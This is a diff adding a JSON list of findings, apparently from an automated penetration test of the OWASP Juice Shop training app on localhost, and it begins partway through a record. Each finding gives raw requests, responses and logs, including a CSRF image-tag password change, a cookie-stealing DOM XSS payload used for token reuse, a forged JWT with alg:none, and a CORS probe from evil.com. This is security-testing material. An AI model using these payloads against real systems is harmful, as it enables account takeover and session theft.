+        "HTTP 200 OK\\nResponse: {\"user\":{\"id\":1,\"password\":\"5e9d11a14ad1c8dd77e98ef9b53fd1ba\",\"role\":\"admin\"}}\\nPassword hash changed from 0192023a7bbd73250516f069df18b500 to 5e9d11a14ad1c8dd77e98ef9b53fd1ba"
+      ],
+      "explanation": "The password change endpoint accepts GET requests with sensitive parameters (current password, new password) in the URL query string. This violates HTTP method semantics and creates a CSRF vulnerability. Since the application has no CSRF protection (no tokens found in any form), an attacker can embed an image tag or link like <img src='http://target/rest/user/change-password?current=X&new=Y&repeat=Y'> in any webpage. When an authenticated Juice Shop user views this page, their browser will send the GET request with their authentication cookie, changing their password. The JWT token cookie lacks SameSite=Strict, allowing cross-origin requests to carry the authentication token."
+    },
+    "remediation": "",
+    "plugin_or_component": "REST Password Change API",
+    "endpoint": "http://127.0.0.1:3000/rest/user/change-password",
+    "discovered_by_agent": "headless-browser",
+    "discovered_at": "2026-07-28T07:52:06Z",
+    "id": "vuln_311ab8",
+    "project_id": "proj_ae3ed3",
+    "target_id": "tgt_be6f57"
+  },
+  {
+    "campaign_id": "camp_20260728_9018be77",
+    "node_id": "",
+    "title": "Password Change Response Leaks Password Hash",
+    "severity": "high",
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+    "cve": null,
+    "category": "information_disclosure",
+    "mitre_attack_id": "T1552.001",
+    "mitre_attack_name": "Unsecured Credentials: Credentials In Files",
+    "iso27001_control": "A.10.1.1",
+    "status": "exploited",
+    "description": "The password change endpoint at /rest/user/change-password returns the full user object in its response, including the MD5 password hash of the newly set password. After changing the admin password, the response body contained the new hash 5e9d11a14ad1c8dd77e98ef9b53fd1ba. This information disclosure enables an attacker who has compromised a session to immediately obtain the password hash for offline cracking, even if they don't know the original password that was set. The hash uses unsalted MD5, which is trivially reversible.",
+    "evidence": {
+      "commands": [
+        "GET /rest/user/change-password?current=admin123&new=newpassword&repeat=newpassword"
+      ],
+      "payloads": [],
+      "raw_request": "GET /rest/user/change-password?current=admin123&new=newpassword&repeat=newpassword HTTP/1.1\\nAuthorization: Bearer eyJ...",
+      "raw_response": "HTTP/1.1 200 OK\\n{\"user\":{\"id\":1,\"password\":\"5e9d11a14ad1c8dd77e98ef9b53fd1ba\",\"role\":\"admin\",\"totpSecret\":\"\"}}",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
+        "Response contains: {\"user\":{\"password\":\"5e9d11a14ad1c8dd77e98ef9b53fd1ba\",...}}\\nMD5(\"newpassword\") = 5e9d11a14ad1c8dd77e98ef9b53fd1ba"
+      ],
+      "explanation": "When a user changes their password, the server responds with the complete user object including the MD5 hash of the new password. The response body contained {\"user\":{\"id\":1,\"email\":\"admin@juice-sh.op\",\"password\":\"5e9d11a14ad1c8dd77e98ef9b53fd1ba\"}}. The hash 5e9d11a14ad1c8dd77e98ef9b53fd1ba corresponds to MD5(\"newpassword\"). This means any authenticated API caller can see the hash of passwords after change operations. Combined with the use of unsalted MD5, passwords are trivially recoverable from these hashes using rainbow tables or hash databases."
+    },
+    "remediation": "",
+    "plugin_or_component": "REST Password Change API / Sequelize",
+    "endpoint": "http://127.0.0.1:3000/rest/user/change-password",
+    "discovered_by_agent": "headless-browser",
+    "discovered_at": "2026-07-28T07:52:22Z",
+    "id": "vuln_fd25a8",
+    "project_id": "proj_ae3ed3",
+    "target_id": "tgt_be6f57"
+  },
+  {
+    "campaign_id": "camp_20260728_9018be77",
+    "node_id": "",
+    "title": "DOM XSS to Session Hijacking - Full Cookie and Token Theft Chain",
+    "severity": "critical",
+    "cvss_score": 9.6,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H",
+    "cve": null,
+    "category": "xss_stored",
+    "mitre_attack_id": "T1539",
+    "mitre_attack_name": "Steal Web Session Cookie",
+    "iso27001_control": "A.14.2.5",
+    "status": "exploited",
+    "description": "The confirmed DOM XSS vulnerability in the search functionality was weaponized into a complete session hijacking attack chain. A crafted URL with the payload &lt;img src=x onerror=\"window.__stolen=document.cookie\"&gt; successfully exfiltrated the full authentication token from both document.cookie and localStorage. The stolen JWT token was then reused in a separate browser context to access admin APIs (HTTP 200), confirming full account takeover. No CSP, non-httpOnly cookies, and JWT in localStorage create a perfect storm for session theft via XSS.",
+    "evidence": {
+      "commands": [
+        "1. Login as admin, set JWT in cookie and localStorage",
+        "2. Navigate to /#/search?q=<img src=x onerror=\"window.__stolen=document.cookie\">",
+        "3. page.evaluate(() => window.__stolen) -> full cookie string with token",
+        "4. Reuse token in new browser context -> GET /rest/admin/application-configuration -> HTTP 200"
+      ],
+      "payloads": [],
+      "raw_request": "GET /#/search?q=<img src=x onerror=\"window.__stolen=document.cookie\"> (victim's browser)",
+      "raw_response": "XSS executes, window.__stolen = \"token=eyJ0eXAi...\" (full admin JWT token exfiltrated)",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
+        "Stolen cookie: language=en; welcomebanner_status=dismiss; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...",
+        "Stolen localStorage: {\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...\"}",
+        "Token reuse in new context: Admin API access -> HTTP 200"
+      ],
+      "explanation": "This demonstrates a complete end-to-end attack: (1) An attacker crafts a URL with an XSS payload that reads document.cookie or localStorage, (2) When an authenticated user clicks the link, the XSS fires and captures their JWT authentication token, (3) The attacker uses this token in their own browser to impersonate the victim. This was proven by stealing the admin's JWT token via the XSS payload, then using that token in a completely new browser context to successfully access /rest/admin/application-configuration (HTTP 200). This chain is made possible by: no CSP header, non-httpOnly token cookie, JWT stored in localStorage, and the DOM XSS vulnerability."
+    },
+    "remediation": "",
+    "plugin_or_component": "Angular Search Component / Express Session",
+    "endpoint": "http://127.0.0.1:3000/#/search?q=%3Cimg%20src%3Dx%20onerror%3D%22window.__stolen%3Ddocument.cookie%22%3E",
+    "discovered_by_agent": "headless-browser",
+    "discovered_at": "2026-07-28T07:53:26Z",
+    "id": "vuln_f84f86",
+    "project_id": "proj_ae3ed3",
+    "target_id": "tgt_be6f57"
+  },
+  {
+    "campaign_id": "camp_20260728_9018be77",
+    "node_id": "",
+    "title": "Prometheus Metrics Endpoint Exposed Without Authentication",
+    "severity": "medium",
+    "cvss_score": 5.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+    "cve": null,
+    "category": "information_disclosure",
+    "mitre_attack_id": "T1082",
+    "mitre_attack_name": "System Information Discovery",
+    "iso27001_control": "A.12.6.1",
+    "status": "confirmed",
+    "description": "The /metrics endpoint exposes Prometheus metrics (26,051 bytes) without authentication. This reveals operational data including: HTTP request counts by status code (957 2XX, 18 5XX, 33 4XX, 208 3XX), CPU usage (26.8s user time), challenge completion status (juiceshop_challenges_solved by difficulty and category), and process-level metrics. While this doesn't directly expose user data, it reveals application internals, error rates, and security challenge status that could aid an attacker in understanding the application's state and planning further attacks.",
+    "evidence": {
+      "commands": [
+        "GET /metrics -> HTTP 200, 26051 bytes of Prometheus metrics"
+      ],
+      "payloads": [],
+      "raw_request": "GET /metrics HTTP/1.1\\nHost: 127.0.0.1:3000",
+      "raw_response": "HTTP/1.1 200 OK\\n# HELP http_requests_count Total HTTP request count\\nhttp_requests_count{status_code=\"2XX\"} 957\\n...",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
+        "http_requests_count{status_code=\"2XX\",app=\"juiceshop\"} 957\\nhttp_requests_count{status_code=\"5XX\",app=\"juiceshop\"} 18\\njuiceshop_challenges_solved{difficulty=\"4\",category=\"Observability Failures\"} 2"
+      ],
+      "explanation": "The /metrics endpoint returns standard Prometheus metrics in text format without requiring any authentication. It exposes HTTP request counters, CPU/memory usage, challenge completion metrics specific to Juice Shop (juiceshop_challenges_solved), and process-level statistics. This information disclosure can be used to fingerprint the application version, understand traffic patterns, identify error-prone endpoints (5XX count), and monitor the application's security posture. In a production environment, this would reveal operational details to any unauthenticated attacker."
+    },
+    "remediation": "",
+    "plugin_or_component": "Prometheus Metrics Middleware",
+    "endpoint": "http://127.0.0.1:3000/metrics",
+    "discovered_by_agent": "headless-browser",
+    "discovered_at": "2026-07-28T07:53:43Z",
+    "id": "vuln_c0e799",
+    "project_id": "proj_ae3ed3",
+    "target_id": "tgt_be6f57"
+  },
+  {
+    "campaign_id": "camp_20260728_9018be77",
+    "node_id": "",
+    "title": "Wildcard CORS on All API Endpoints Including Sensitive Data",
+    "severity": "medium",
+    "cvss_score": 5.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+    "cve": null,
+    "category": "insecure_configuration",
+    "mitre_attack_id": "T1189",
+    "mitre_attack_name": "Drive-by Compromise",
+    "iso27001_control": "A.14.1.2",
+    "status": "confirmed",
+    "description": "All API endpoints return Access-Control-Allow-Origin: * header, including sensitive endpoints like /api/Users (user listing), /api/Products, and /rest/admin/application-configuration. While the wildcard CORS does not allow credentials (browsers refuse to send credentials with wildcard origin), it enables any website to read API responses for unauthenticated endpoints. Since the admin configuration, product catalog, security questions, and challenge data are accessible without authentication, any third-party website can silently read this data via cross-origin requests.",
+    "evidence": {
+      "commands": [
+        "Checked Access-Control-Allow-Origin header on /api/Products, /api/Users, /rest/admin/application-configuration"
+      ],
+      "payloads": [],
+      "raw_request": "GET /api/Products HTTP/1.1\\nOrigin: http://evil.com",
+      "raw_response": "HTTP/1.1 200 OK\\nAccess-Control-Allow-Origin: *",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
+        "Products API: {\"access-control-allow-origin\":\"*\"}\\nUsers API: {\"access-control-allow-origin\":\"*\"}\\nAdmin Config: {\"access-control-allow-origin\":\"*\"}"
+      ],
+      "explanation": "Every API endpoint tested returns Access-Control-Allow-Origin: * without Access-Control-Allow-Credentials: true. This means any website on the internet can make cross-origin fetch/XHR requests to these API endpoints and read the responses. While credentials (cookies/tokens) are not sent with wildcard CORS, many sensitive endpoints are accessible without authentication: /rest/admin/application-configuration (23KB of config), /api/SecurityQuestions, /api/Challenges, /api/Products. This allows silent information gathering from any web page the victim visits."
+    },
+    "remediation": "",
+    "plugin_or_component": "Express CORS Middleware",
+    "endpoint": "http://127.0.0.1:3000/api/*",
+    "discovered_by_agent": "headless-browser",
+    "discovered_at": "2026-07-28T07:54:55Z",
+    "id": "vuln_50ed5c",
+    "project_id": "proj_ae3ed3",
+    "target_id": "tgt_be6f57"
+  },
+  {
+    "campaign_id": "camp_20260728_9018be77",
+    "node_id": "",
+    "title": "Negative Quantity Accepted in Basket Items - Business Logic Bypass",
+    "severity": "medium",
+    "cvss_score": 5.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N",
+    "cve": null,
+    "category": "business_logic_flaw",
+    "mitre_attack_id": "T1565.001",
+    "mitre_attack_name": "Data Manipulation: Stored Data Manipulation",
+    "iso27001_control": "A.14.2.5",
+    "status": "exploited",
+    "description": "The /api/BasketItems/{id} PUT endpoint accepts negative quantity values without server-side validation. By sending {\"quantity\": -5} to update a basket item, the server accepted the change (HTTP 200) and stored the negative quantity. This could be exploited to manipulate order totals, potentially resulting in negative prices or credits at checkout. The original quantity was 2 and was changed to -5, with the server responding with a success status.",
+    "evidence": {
+      "commands": [
+        "PUT /api/BasketItems/1 with {\"quantity\": -5} and admin auth token"
+      ],
+      "payloads": [],
+      "raw_request": "PUT /api/BasketItems/1 HTTP/1.1\\nAuthorization: Bearer eyJ...\\nContent-Type: application/json\\n\\n{\"quantity\":-5}",
+      "raw_response": "HTTP/1.1 200 OK\\n{\"status\":\"success\",\"data\":{\"ProductId\":1,\"BasketId\":1,\"id\":1,\"quantity\":-5}}",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
+        "HTTP 200 OK\\n{\"status\":\"success\",\"data\":{\"ProductId\":1,\"BasketId\":1,\"id\":1,\"quantity\":-5}}\\nOriginal quantity: 2, Updated to: -5"
+      ],
+      "explanation": "The basket item update endpoint performs no server-side validation on the quantity field. A PUT request to /api/BasketItems/1 with {\"quantity\": -5} was accepted and the database was updated with the negative value. The response confirmed the quantity was set to -5 for product ID 1 in basket ID 1. This business logic flaw could allow a user to manipulate their order total at checkout by setting items to negative quantities, potentially generating a negative total (credit) or bypassing payment."
+    },
+    "remediation": "",
+    "plugin_or_component": "BasketItems API / Sequelize ORM",
+    "endpoint": "http://127.0.0.1:3000/api/BasketItems/1",
+    "discovered_by_agent": "headless-browser",
+    "discovered_at": "2026-07-28T07:55:50Z",
+    "id": "vuln_b508b1",
+    "project_id": "proj_ae3ed3",
+    "target_id": "tgt_be6f57"
+  },
+  {
+    "campaign_id": "camp_20260728_9018be77",
+    "node_id": "",
+    "title": "JWT Algorithm None Attack - Authentication Bypass",
+    "severity": "critical",
+    "cvss_score": 9.8,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+    "cve": "CVE-2015-9235",
+    "category": "authentication_bypass",
+    "mitre_attack_id": "T1550.001",
+    "mitre_attack_name": "Use Alternate Authentication Material: Application Access Token",
+    "iso27001_control": "A.9.4.2",
+    "status": "exploited",
+    "description": "The application accepts JWT tokens with the algorithm set to 'none', completely bypassing signature verification. By crafting a JWT with header {\"typ\":\"JWT\",\"alg\":\"none\"} and any desired payload (including admin role and arbitrary user ID), the token is accepted by the server without any signature. This was confirmed by sending a crafted alg:none token to /rest/user/whoami which returned the admin user data (HTTP 200). An attacker can impersonate any user by simply base64-encoding a forged JWT payload with no signature.",
+    "evidence": {
+      "commands": [
+        "1. Crafted JWT header: {\"typ\":\"JWT\",\"alg\":\"none\"}",
+        "2. Set payload with admin role and id:1",
+        "3. Created token: base64(header).base64(payload). (empty signature)",
+        "4. Sent to /rest/user/whoami -> HTTP 200"
+      ],
+      "payloads": [],
+      "raw_request": "GET /rest/user/whoami HTTP/1.1\\nAuthorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.{forged_payload}.",
+      "raw_response": "HTTP/1.1 200 OK\\n{\"user\":{\"id\":1,\"email\":\"admin@juice-sh.op\",\"profileImage\":\"defaultAdmin.png\"}}",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
+        "Original JWT alg: RS256",
+        "Crafted alg:none token accepted: HTTP 200",
+        "Response: {\"user\":{\"id\":1,\"email\":\"admin@juice-sh.op\",\"profileImage\":\"assets/public/images/uploads/defaultAdmin.png\"}}"
+      ],
+      "explanation": "The JWT library used by the application does not properly validate the algorithm field in the JWT header. When a token is crafted with {\"alg\":\"none\"} and submitted with an empty signature, the server accepts it as valid. This means an attacker can create any JWT with any claims (role, userId, email) without needing the RSA private key. The attack was demonstrated by creating a token with admin claims and verifying it against the /rest/user/whoami endpoint, which confirmed the identity as admin@juice-sh.op. This is a critical authentication bypass that affects all JWT-protected endpoints."
+    },
+    "remediation": "",
+    "plugin_or_component": "JWT Authentication Library (jsonwebtoken)",
+    "endpoint": "http://127.0.0.1:3000/rest/user/whoami",
+    "discovered_by_agent": "headless-browser",
+    "discovered_at": "2026-07-28T07:59:18Z",
+    "id": "vuln_1c3581",
+    "project_id": "proj_ae3ed3",
+    "target_id": "tgt_be6f57"
+  },
+  {
+    "campaign_id": "camp_20260728_9018be77",
+    "node_id": "",
+    "title": "Security Questions Exposed Without Authentication",
+    "severity": "low",
+    "cvss_score": 3.7,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
+    "cve": null,
+    "category": "information_disclosure",
+    "mitre_attack_id": "T1589.001",
+    "mitre_attack_name": "Gather Victim Identity Information: Credentials",
+    "iso27001_control": "A.9.4.2",
+    "status": "confirmed",
+    "description": "The /rest/user/security-question endpoint allows unauthenticated users to retrieve the security question assigned to any email address. By providing email=admin@juice-sh.op, the response reveals that the admin's security question is 'Mother's maiden name?' (question ID 2). This information aids in password reset attacks by revealing which question to research/social engineer, and confirms that a given email address exists in the system (user enumeration).",
+    "evidence": {
+      "commands": [
+        "GET /rest/user/security-question?email=admin@juice-sh.op -> HTTP 200"
+      ],
+      "payloads": [],
+      "raw_request": "GET /rest/user/security-question?email=admin@juice-sh.op HTTP/1.1",
+      "raw_response": "HTTP/1.1 200 OK\\n{\"question\":{\"id\":2,\"question\":\"Mother's maiden name?\"}}",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
+        "HTTP 200: {\"question\":{\"id\":2,\"question\":\"Mother's maiden name?\"}}"
+      ],
+      "explanation": "The security question retrieval endpoint does not require authentication and reveals both the existence of an email account and the specific security question assigned to it. For admin@juice-sh.op, the response reveals the question is 'Mother's maiden name?' which could be researched through OSINT or social engineering. Combined with the user data already leaked through the JWT token (which contains full user records), this provides another attack vector for account takeover via password reset."
+    },
+    "remediation": "",
+    "plugin_or_component": "REST User Security Question API",
+    "endpoint": "http://127.0.0.1:3000/rest/user/security-question?email=admin@juice-sh.op",
+    "discovered_by_agent": "headless-browser",
+    "discovered_at": "2026-07-28T07:59:33Z",
+    "id": "vuln_969211",
+    "project_id": "proj_ae3ed3",
+    "target_id": "tgt_be6f57"
+  },
+  {
+    "campaign_id": "camp_20260728_9018be77",
+    "node_id": "",
+    "title": "JWT Public Key Exposed at /encryptionkeys/jwt.pub",
+    "severity": "medium",
+    "cvss_score": 5.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
+    "cve": null,
+    "category": "information_disclosure",
+    "mitre_attack_id": "T1552",
+    "mitre_attack_name": "Unsecured Credentials",
+    "iso27001_control": "A.10.1.2",
+    "status": "confirmed",
+    "description": "The RSA public key used for JWT signature verification is exposed at /encryptionkeys/jwt.pub without authentication. While the public key alone doesn't compromise authentication, it enables RS256-to-HS256 algorithm confusion attacks where an attacker could craft valid JWTs signed with the public key as an HMAC secret. The key format is RSA (MIGJAoGBAM3CosR73CBN...) and the JWT uses RS256 signing. Combined with the confirmed alg:none bypass, this further weakens the JWT security posture.",
+    "evidence": {
+      "commands": [
+        "GET /encryptionkeys/jwt.pub -> HTTP 200 with RSA public key"
+      ],
+      "payloads": [],
+      "raw_request": "GET /encryptionkeys/jwt.pub HTTP/1.1",
+      "raw_response": "HTTP/1.1 200 OK\\n-----BEGIN RSA PUBLIC KEY-----\\nMIGJAoGBAM3CosR73CBN...AgMBAAE=\\n-----END RSA PUBLIC KEY-----",
+      "extracted_data": null,
+      "screenshots": [],
+      "logs": [
+        "HTTP 200 OK\\n-----BEGIN RSA PUBLIC KEY-----\\nMIGJAoGBAM3CosR73CBNcJsLv5E90NsFt6qN1uziQ484gbOoule8leXHFbyIzPQRozgEpSpiwhr6d2/c0CfZHEJ3m5tV0klxfjfM7oqjRMURnH/rmBjcETQ7qzIISZQ/iptJ3p7Gi78X5ZMhLNtDkUFU9WaGdiEb+SnC39wjErmJSfmGb7i1AgMBAAE=\\n-----END RSA PUBLIC KEY-----"
+      ],
+      "explanation": "The JWT RSA public key is served at /encryptionkeys/jwt.pub without authentication. While the private key returned 404 (not directly exposed), the public key enables algorithm confusion attacks. An attacker could change the JWT header to HS256 (HMAC) and sign the token using the public key as the HMAC secret. Since the server might accept HMAC signatures verified with the public key (which is known), this enables forging valid JWT tokens. The key is a 1024-bit RSA key which is also considered weak by modern standards."
+    },
+    "remediation": "",
+    "plugin_or_component": "Express Static File Server / Encryption Keys",
+    "endpoint": "http://127.0.0.1:3000/encryptionkeys/jwt.pub",
+    "discovered_by_agent": "headless-browser",
+    "discovered_at": "2026-07-28T07:59:58Z",
+    "id": "vuln_a28b93",
+    "project_id": "proj_ae3ed3",
+    "target_id": "tgt_be6f57"
+  }
+]
